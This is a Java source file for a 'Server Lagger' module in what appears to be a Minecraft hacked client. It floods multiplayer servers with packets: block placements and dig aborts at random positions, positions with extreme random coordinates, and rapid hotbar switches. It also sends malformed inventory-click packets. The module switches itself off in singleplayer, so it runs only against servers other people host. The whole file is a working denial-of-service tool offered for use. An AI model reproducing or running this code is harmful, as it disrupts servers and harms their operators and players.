package wtf.bhopper.nonsense.module.impl.exploit;

import io.netty.util.internal.ThreadLocalRandom;
import net.minecraft.init.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.*;
import net.minecraft.util.BlockPos;
import net.minecraft.util.EnumFacing;
import wtf.bhopper.nonsense.event.bus.EventLink;
import wtf.bhopper.nonsense.event.bus.Listener;
import wtf.bhopper.nonsense.event.impl.EventTick;
import wtf.bhopper.nonsense.module.Module;
import wtf.bhopper.nonsense.module.ModuleCategory;
import wtf.bhopper.nonsense.module.ModuleInfo;
import wtf.bhopper.nonsense.module.property.impl.BooleanProperty;
import wtf.bhopper.nonsense.module.property.impl.EnumProperty;
import wtf.bhopper.nonsense.module.property.impl.NumberProperty;
import wtf.bhopper.nonsense.util.minecraft.BlockUtil;
import wtf.bhopper.nonsense.util.minecraft.PacketUtil;
import wtf.bhopper.nonsense.util.minecraft.PlayerUtil;
import wtf.bhopper.nonsense.util.misc.Clock;

@ModuleInfo(name = "Server Lagger",
        description = "Lags a server",
        category = ModuleCategory.EXPLOIT)
public class ServerLagger extends Module {

    private final EnumProperty<Mode> mode = new EnumProperty<>("Mode", "Method to cause lag.", Mode.INTERACT);
    private final NumberProperty delay = new NumberProperty("Delay",
            "Delay between sending packets.",
            () -> this.mode.isAny(Mode.INTERACT, Mode.BREAK, Mode.POSITION, Mode.SWITCH),
            100.0,
            1.0,
            5000.0,
            1.0,
            NumberProperty.FORMAT_MS);
    private final NumberProperty amount = new NumberProperty("Amount",
            "Amount of packets to send.",
            () -> this.mode.isAny(Mode.INTERACT, Mode.BREAK, Mode.POSITION, Mode.SWITCH),
            500.0,
            1.0,
            10000.0,
            1.0,
            NumberProperty.FORMAT_INT);
    private final BooleanProperty random = new BooleanProperty("Random", "Randomizes packets sent", true, () -> this.mode.isAny(Mode.INTERACT, Mode.BREAK, Mode.POSITION));


    private final Clock delayClock = new Clock();

    public ServerLagger() {
        this.addProperties(this.mode, this.delay, this.amount, this.random);
        this.setSuffix(this.mode::getDisplayValue);
    }

    @EventLink
    public final Listener<EventTick> onTick = event -> {
        if (!PlayerUtil.canUpdate() || mc.thePlayer.ticksExisted < 20 || mc.isSingleplayer()) {
            this.toggle(false);
            return;
        }

        switch (this.mode.get()) {
            case INTERACT -> {
                if (this.delayClock.hasReached(this.delay.getInt())) {
                    for (int i = 0; i < this.amount.getInt(); i++) {
                        if (this.random.get()) {
                            PacketUtil.send(new C08PacketPlayerBlockPlacement(BlockUtil.randomPos(), 0, null, 0.0F, 0.0F, 0.0F));
                        } else {
                            PacketUtil.send(new C08PacketPlayerBlockPlacement(BlockPos.ORIGIN, 0, null, 0.0F, 0.0F, 0.0F));
                        }
                    }
                    this.delayClock.reset();
                }

            }

            case BREAK -> {
                if (this.delayClock.hasReached(this.delay.getInt())) {
                    for (int i = 0; i < this.amount.getInt(); i++) {
                        if (this.random.get()) {
                            PacketUtil.send(new C07PacketPlayerDigging(C07PacketPlayerDigging.Action.ABORT_DESTROY_BLOCK, BlockUtil.randomPos(), EnumFacing.UP));
                        } else {
                            PacketUtil.send(new C07PacketPlayerDigging(C07PacketPlayerDigging.Action.ABORT_DESTROY_BLOCK, BlockPos.ORIGIN, EnumFacing.UP));
                        }
                    }
                    this.delayClock.reset();
                }
            }

            case POSITION -> {
                if (this.delayClock.hasReached(this.delay.getInt())) {
                    for (int i = 0; i < this.amount.getInt(); i++) {
                        if (this.random.get()) {
                            PacketUtil.send(new C03PacketPlayer.C04PacketPlayerPosition(
                                    ThreadLocalRandom.current().nextDouble(-3.0E+7, 3.0E+7),
                                    ThreadLocalRandom.current().nextDouble(-3.0E+7, 3.0E+7),
                                    ThreadLocalRandom.current().nextDouble(-3.0E+7, 3.0E+7),
                                    ThreadLocalRandom.current().nextBoolean()
                            ));
                        } else {
                            PacketUtil.send(new C03PacketPlayer.C04PacketPlayerPosition(0.0, 0.0, 0.0, false));
                        }
                    }
                    this.delayClock.reset();
                }
            }

            case SWITCH -> {
                if (this.delayClock.hasReached(this.delay.getInt())) {
                    int prevSlot = mc.thePlayer.inventory.currentItem;
                    int slot = 0;
                    for (int i = 0; i < this.amount.getInt(); i++) {
                        do {
                            slot = ThreadLocalRandom.current().nextInt(0, 9);
                        } while (slot == prevSlot);
                        PacketUtil.send(new C09PacketHeldItemChange(slot));
                        prevSlot = slot;
                    }
                    if (slot != mc.thePlayer.inventory.currentItem) {
                        PacketUtil.send(new C09PacketHeldItemChange(mc.thePlayer.inventory.currentItem));
                    }
                    this.delayClock.reset();
                }
            }

            case PISTON_CLICK -> PacketUtil.send(new C0EPacketClickWindow(0, 0, 0, 1, new ItemStack(Blocks.piston_head), (short)0));

            case INVALID_CLICK -> PacketUtil.send(new C0EPacketClickWindow(0, 0, -1, 2, new ItemStack(Blocks.air), (short)0));
        }

    };

    private enum Mode {
        INTERACT,
        BREAK,
        POSITION,
        SWITCH,
        PISTON_CLICK,
        INVALID_CLICK
    }


}
